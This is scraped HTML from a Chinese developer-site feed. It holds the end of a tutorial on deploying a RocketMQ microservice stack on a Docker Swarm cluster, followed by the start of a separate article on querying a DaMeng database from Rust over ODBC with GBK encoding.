      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">27017</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">27017</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># 可选：添加监控服务</span>
  <span class="hljs-attr">visualizer:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">dockersamples/visualizer:latest</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.role==manager</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8081:8080"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"/var/run/docker.sock:/var/run/docker.sock"</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

<span class="hljs-comment"># 覆盖网络定义</span>
<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">app-network:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">overlay</span>
    <span class="hljs-attr">attachable:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment"># 数据卷定义</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">mongo_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>  
  <span class="hljs-attr">mongo_config:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmqnamesrv_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmqbroker_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">springboot_logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
</code></pre>
<h3 data-id="heading-10">3.2 创建 Broker 配置文件</h3>
<p>创建 <code>broker.conf</code>适配集群环境：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Broker 配置 - 集群优化版</span>
<span class="hljs-attr">brokerClusterName</span> = DefaultCluster
<span class="hljs-attr">brokerName</span> = broker-a
<span class="hljs-attr">brokerId</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">deleteWhen</span> = <span class="hljs-number">04</span>
<span class="hljs-attr">fileReservedTime</span> = <span class="hljs-number">48</span>
<span class="hljs-attr">brokerRole</span> = ASYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = ASYNC_FLUSH

<span class="hljs-comment"># 集群配置</span>
<span class="hljs-attr">namesrvAddr</span> = rmqnamesrv:<span class="hljs-number">9876</span>
<span class="hljs-attr">brokerIP1</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.11</span>  <span class="hljs-comment"># 根据实际节点IP修改</span>

<span class="hljs-comment"># 性能优化</span>
<span class="hljs-attr">mapedFileSizeCommitLog</span> = <span class="hljs-number">1073741824</span>
<span class="hljs-attr">mapedFileSizeConsumeQueue</span> = <span class="hljs-number">300000</span>
<span class="hljs-attr">maxMessageSize</span> = <span class="hljs-number">65536</span>
</code></pre>
<h2 data-id="heading-11">四、节点标签与资源规划</h2>
<h3 data-id="heading-12">4.1 为节点打标签</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 为运行有状态服务的节点打标签</span>
docker node update --label-add <span class="hljs-attr">redis</span>=<span class="hljs-literal">true</span> worker1
docker node update --label-add <span class="hljs-attr">rocketmq</span>=<span class="hljs-literal">true</span> worker1  
docker node update --label-add <span class="hljs-attr">mongo</span>=<span class="hljs-literal">true</span> worker1

<span class="hljs-comment"># 验证标签</span>
docker node inspect worker1 | grep Labels
</code></pre>
<h3 data-id="heading-13">4.2 资源规划策略</h3>
<ul>
<li><strong>有状态服务</strong>：固定部署在特定节点（使用标签约束）</li>
<li><strong>无状态服务</strong>：可在工作节点间自动调度</li>
<li><strong>管理节点</strong>：只运行管理服务，不运行业务容器</li>
</ul>
<h2 data-id="heading-14">五、集群网络与存储配置</h2>
<h3 data-id="heading-15">5.1 创建覆盖网络</h3>
<pre><code class="hljs language-sql" lang="sql"># 创建用于服务发现的覆盖网络
docker network <span class="hljs-keyword">create</span> <span class="hljs-operator">-</span>d <span class="hljs-keyword">overlay</span> <span class="hljs-comment">--attachable app-network</span>

# 验证网络
docker network ls <span class="hljs-operator">|</span> grep <span class="hljs-keyword">overlay</span>
</code></pre>
<h3 data-id="heading-16">5.2 配置共享存储（生产环境建议）</h3>
<p>对于有状态服务的数据持久化，建议使用网络存储：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-comment"># 生产环境建议使用：</span>
    <span class="hljs-comment"># driver: nfs</span>
    <span class="hljs-comment"># driver_opts:</span>
    <span class="hljs-comment">#   share: "192.168.1.100:/data/redis"</span>
</code></pre>
<h2 data-id="heading-17">六、部署与验证</h2>
<h3 data-id="heading-18">6.1 部署应用栈</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在管理节点执行部署</span>
docker stack deploy -c docker-compose.swarm.yml rocketmq-app

<span class="hljs-comment"># 查看服务状态</span>
docker stack services rocketmq-app

<span class="hljs-comment"># 实时监控部署进度</span>
watch docker service <span class="hljs-built_in">ls</span>
</code></pre>
<h3 data-id="heading-19">6.2 验证服务状态</h3>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># 查看所有服务状态</span>
docker service ls

<span class="hljs-comment"># 查看具体服务详情</span>
docker service ps rocketmq-app_my-springboot-app

<span class="hljs-comment"># 查看服务日志</span>
docker service logs rocketmq-app_my-springboot-app

<span class="hljs-comment"># 测试服务连通性</span>
curl <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.1.10:8080/actuator</span><span class="hljs-regexp">/health
curl http:/</span><span class="hljs-regexp">/192.168.1.11:8080/actuator</span><span class="hljs-regexp">/health  
curl http:/</span><span class="hljs-regexp">/192.168.1.12:8080/actuator</span><span class="hljs-regexp">/health
</span></code></pre>
<h3 data-id="heading-20">6.3 验证 RocketMQ 集群</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入容器测试 RocketMQ</span>
docker <span class="hljs-built_in">exec</span> -it $(docker ps -q -f name=rocketmq-app_my-springboot-app) sh

<span class="hljs-comment"># 在容器内测试</span>
./mqadmin clusterList -n rmqnamesrv:9876
./mqadmin topicList -n rmqnamesrv:9876
</code></pre>
<h2 data-id="heading-21">七、集群运维与管理</h2>
<h3 data-id="heading-22">7.1 常用管理命令</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 扩展应用实例数</span>
docker service scale <span class="hljs-attr">rocketmq-app_my-springboot-app</span>=<span class="hljs-number">5</span>

<span class="hljs-comment"># 滚动更新服务</span>
docker service update --image my-springboot-app:v2.0 rocketmq-app_my-springboot-app

<span class="hljs-comment"># 查看服务详情</span>
docker service inspect rocketmq-app_my-springboot-app

<span class="hljs-comment"># 故障节点处理</span>
docker node update --availability drain worker1  <span class="hljs-comment"># 排空节点</span>
docker node update --availability active worker1   <span class="hljs-comment"># 重新激活</span>
</code></pre>
<h3 data-id="heading-23">7.2 监控与日志</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 设置日志驱动（在docker-compose中配置）</span>
<span class="hljs-attr">deploy:</span>
  <span class="hljs-attr">logging:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">"json-file"</span>
    <span class="hljs-attr">options:</span>
      <span class="hljs-attr">max-size:</span> <span class="hljs-string">"10m"</span>
      <span class="hljs-attr">max-file:</span> <span class="hljs-string">"3"</span>

<span class="hljs-comment"># 集中日志收集（建议）</span>
<span class="hljs-comment"># 可集成ELK或Fluentd进行日志聚合</span>
</code></pre>
<h3 data-id="heading-24">7.3 备份与恢复</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 备份有状态服务数据</span>
docker run --<span class="hljs-built_in">rm</span> -v rocketmq-app_redis_data:/source -v $(<span class="hljs-built_in">pwd</span>)/backup:/backup alpine \
  tar czf /backup/redis_$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /source .

<span class="hljs-comment"># 创建管理节点备份</span>
docker swarm init --force-new-cluster  <span class="hljs-comment"># 在故障恢复时使用</span>
</code></pre>
<h2 data-id="heading-25">八、高可用与故障转移测试</h2>
<h3 data-id="heading-26">8.1 模拟节点故障</h3>
<pre><code class="hljs language-sql" lang="sql"># 模拟工作节点故障
docker node <span class="hljs-keyword">update</span> <span class="hljs-comment">--availability drain worker1</span>

# 观察服务自动迁移
watch docker service ps rocketmq<span class="hljs-operator">-</span>app_my<span class="hljs-operator">-</span>springboot<span class="hljs-operator">-</span>app

# 恢复节点
docker node <span class="hljs-keyword">update</span> <span class="hljs-comment">--availability active worker1</span>
</code></pre>
<h3 data-id="heading-27">8.2 管理节点高可用</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 提升其他节点为管理节点（实现管理节点HA）</span>
docker node promote worker1
docker node promote worker2

<span class="hljs-comment"># 查看管理节点状态</span>
docker node <span class="hljs-built_in">ls</span>
</code></pre>
<h2 data-id="heading-28">九、生产环境优化建议</h2>
<h3 data-id="heading-29">9.1 安全加固</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 使用TLS加密集群通信</span>
docker swarm <span class="hljs-keyword">init</span> --advertise-addr <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span> --autolock

<span class="hljs-meta"># 定期轮换加密密钥</span>
docker swarm unlock-key --rotate
</code></pre>
<h3 data-id="heading-30">9.2 资源限制与预留</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">deploy:</span>
  <span class="hljs-attr">resources:</span>
    <span class="hljs-attr">limits:</span>
      <span class="hljs-attr">cpus:</span> <span class="hljs-string">'1.0'</span>
      <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span>
    <span class="hljs-attr">reservations:</span>
      <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.5'</span>
      <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
</code></pre>
<h3 data-id="heading-31">9.3 健康检查配置</h3>
<pre><code class="hljs language-bash" lang="bash">healthcheck:
  <span class="hljs-built_in">test</span>: [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"curl"</span>, <span class="hljs-string">"-f"</span>, <span class="hljs-string">"http://localhost:8080/actuator/health"</span>]
  interval: 30s
  <span class="hljs-built_in">timeout</span>: 10s
  retries: 3
  start_period: 40s
</code></pre>
<h2 data-id="heading-32">十、常见问题排查</h2>
<h3 data-id="heading-33">10.1 服务无法启动</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看详细错误信息</span>
docker service logs rocketmq-app_my-springboot-app --details

<span class="hljs-comment"># 检查网络连通性</span>
docker network inspect app-network

<span class="hljs-comment"># 检查节点资源</span>
docker node ps $(docker node <span class="hljs-built_in">ls</span> -q)
</code></pre>
<h3 data-id="heading-34">10.2 数据持久化问题</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查卷状态</span>
docker volume <span class="hljs-built_in">ls</span>

<span class="hljs-comment"># 进入容器检查挂载点</span>
docker <span class="hljs-built_in">exec</span> -it &lt;container_id&gt; <span class="hljs-built_in">df</span> -h
</code></pre>
<h2 data-id="heading-35">总结</h2>
<p>通过本文的详细步骤，您已成功将 RocketMQ 微服务项目从单机 Docker Compose 部署升级为高可用的 Docker Swarm 集群部署。关键改进包括：</p>
<ol>
<li><strong>✅ 高可用性</strong>：多节点部署，自动故障转移</li>
<li><strong>✅ 弹性伸缩</strong>：无状态服务水平扩展，有状态服务稳定运行</li>
<li><strong>✅ 服务发现</strong>：覆盖网络实现跨主机服务通信</li>
<li><strong>✅ 滚动更新</strong>：零停机部署新版本</li>
<li><strong>✅ 资源管理</strong>：精细化的CPU/内存控制</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[达梦 数据库 Rust 实战]]></title>    <link>https://juejin.cn/post/7575910333400350774</link>    <guid>https://juejin.cn/post/7575910333400350774</guid>    <pubDate>2025-11-24T06:53:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400350774" data-draft-id="7575910333400301622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="达梦 数据库 Rust 实战"/> <meta itemprop="keywords" content="Rust,数据分析,数据库"/> <meta itemprop="datePublished" content="2025-11-24T06:53:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Andrew_Ryan"/> <meta itemprop="url" content="https://juejin.cn/user/3993068510655703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            达梦 数据库 Rust 实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993068510655703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Andrew_Ryan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:53:07.000Z" title="Mon Nov 24 2025 06:53:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2e7c8103cd249a8ae8df5e2e82816e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcmV3X1J5YW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571986&amp;x-signature=TjikhZudy0OV9Ujgy%2BP8cv3e5MU%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/466c8b6864564d5fa37f7c8d47d525e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcmV3X1J5YW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571986&amp;x-signature=5KzUscub70mPJ4NEOA8PBeS%2FfYw%3D" alt="image.png" loading="lazy"/></p>
<p><code>Cargo.toml</code></p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"dameng_rust_demo"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2024"</span>



<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">odbc-api</span> = { version = <span class="hljs-string">"8.1.4"</span>, features = [<span class="hljs-string">"derive"</span>] }
<span class="hljs-attr">env_logger</span> = <span class="hljs-string">"0.11"</span>
<span class="hljs-attr">anyhow</span> = <span class="hljs-string">"1.0.100"</span>
<span class="hljs-attr">encoding_rs</span> = <span class="hljs-string">"0.8"</span>
</code></pre>
<p><code>main.rs</code></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> anyhow::<span class="hljs-type">Result</span>;
<span class="hljs-keyword">use</span> odbc_api::{
    ConnectionOptions, Environment,
    parameter::VarCharArray,
};
<span class="hljs-keyword">use</span> encoding_rs::GBK;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// Initialize logging</span>
    env_logger::<span class="hljs-title function_ invoke__">init</span>();

    <span class="hljs-comment">// Create ODBC environment</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">env</span> = Environment::<span class="hljs-title function_ invoke__">new</span>()?;

    <span class="hljs-comment">// DaMeng database connection string</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">connection_string</span> = <span class="hljs-string">"
        Driver={DM8 ODBC DRIVER};
        Server=localhost;
        Port=5236;
        UID=SYSDBA;
        PWD=my_passowrd;
    "</span>;

    <span class="hljs-comment">// Establish connection with proper error handling</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">conn</span> = env
        .<span class="hljs-title function_ invoke__">connect_with_connection_string</span>(connection_string, ConnectionOptions::<span class="hljs-title function_ invoke__">default</span>())
        .<span class="hljs-title function_ invoke__">map_err</span>(|e| anyhow::anyhow!(<span class="hljs-string">"Failed to connect: {:?}"</span>, e))?;

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"✓ Successfully connected to DaMeng database"</span>);

    <span class="hljs-comment">// Get database info</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">dbms_name</span> = conn.<span class="hljs-title function_ invoke__">database_management_system_name</span>()?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Database Management System Name: {}"</span>, dbms_name);

    <span class="hljs-comment">// Execute query and process results</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">max_rows_in_batch</span> = <span class="hljs-number">250</span>;
    
    <span class="hljs-comment">// Define row type as a tuple (even for single columns)</span>
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Row</span> = (VarCharArray&lt;<span class="hljs-number">255</span>&gt;, VarCharArray&lt;<span class="hljs-number">255</span>&gt;);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">buffer</span> = odbc_api::buffers::RowVec::&lt;Row&gt;::<span class="hljs-title function_ invoke__">new</span>(max_rows_in_batch);

    <span class="hljs-comment">// 将中文字符串转换为GBK编码</span>
    <span class="hljs-keyword">let</span> (gbk_bytes, _, had_errors) = GBK.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">"张三"</span>);
    <span class="hljs-keyword">if</span> had_errors {
        eprintln!(<span class="hljs-string">"Warning: Some characters could not be encoded to GBK"</span>);
    }
    
    <span class="hljs-comment">// 使用GBK编码的字节数组创建参数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">name_param</span> = odbc_api::parameter::VarCharArray::&lt;<span class="hljs-number">255</span>&gt;::<span class="hljs-title function_ invoke__">new</span>(&amp;gbk_bytes);
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">cursor</span> = conn
        .<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-string">"SELECT * FROM SYSDBA.CHAR_TEST WHERE name=?"</span>, (&amp;name_param,))?
        .<span class="hljs-title function_ invoke__">ok_or_else</span>(|| anyhow::anyhow!(<span class="hljs-string">"SELECT query did not yield a result set"</span>))?;
    
    <span class="hljs-keyword">use</span> odbc_api::Cursor;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">block_cursor</span> = cursor.<span class="hljs-title function_ invoke__">bind_buffer</span>(&amp;<span class="hljs-keyword">mut</span> buffer)?;

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(batch) = block_cursor.<span class="hljs-title function_ invoke__">fetch</span>()? {
        <span class="hljs-comment">// Iterate over rows in the batch</span>
        <span class="hljs-keyword">for</span> <span class="hljs-variable">row</span> <span class="hljs-keyword">in</span> batch.<span class="hljs-title function_ invoke__">iter</span>() {
            <span class="hljs-keyword">let</span> (name, age) = row;
            
            <span class="hljs-comment">// 处理name字段</span>
            <span class="hljs-keyword">match</span> name.<span class="hljs-title function_ invoke__">as_bytes</span>() {
                <span class="hljs-title function_ invoke__">Some</span>(bytes) <span class="hljs-keyword">if</span> !bytes.<span class="hljs-title function_ invoke__">is_empty</span>() =&gt; {
                    <span class="hljs-comment">// 尝试解码为UTF-8，如果失败则尝试GBK</span>
                    <span class="hljs-keyword">match</span> std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(bytes) {
                        <span class="hljs-title function_ invoke__">Ok</span>(utf8_str) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name (UTF-8): {}"</span>, utf8_str),
                        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; {
                            <span class="hljs-keyword">let</span> (decoded, _, _) = GBK.<span class="hljs-title function_ invoke__">decode</span>(bytes);
                            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name (GBK): {}"</span>, decoded);
                        }
                    }
                }
                <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name: NULL"</span>),
                <span class="hljs-literal">None</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name: NULL"</span>),
            }
            
            <span class="hljs-comment">// 处理age字段</span>
            <span class="hljs-keyword">match</span> age.<span class="hljs-title function_ invoke__">as_bytes</span>() {
                <span class="hljs-title function_ invoke__">Some</span>(bytes) <span class="hljs-keyword">if</span> !bytes.<span class="hljs-title function_ invoke__">is_empty</span>() =&gt; {
                    <span class="hljs-keyword">match</span> std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(bytes) {
                        <span class="hljs-title function_ invoke__">Ok</span>(utf8_str) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age (UTF-8): {}"</span>, utf8_str),
                        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; {
                            <span class="hljs-keyword">let</span> (decoded, _, _) = GBK.<span class="hljs-title function_ invoke__">decode</span>(bytes);
                            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age (GBK): {}"</span>, decoded);
                        }
                    }
                }
                <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age: NULL"</span>),
                <span class="hljs-literal">None</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age: NULL"</span>),
            }
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"---"</span>);
        }
    }

    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<pre><code class="hljs language-sh" lang="sh">✓ Successfully connected to DaMeng database
Database Management System Name: 达梦数据库管理系统
Name (GBK): 张三
Age (UTF-8): 29
---
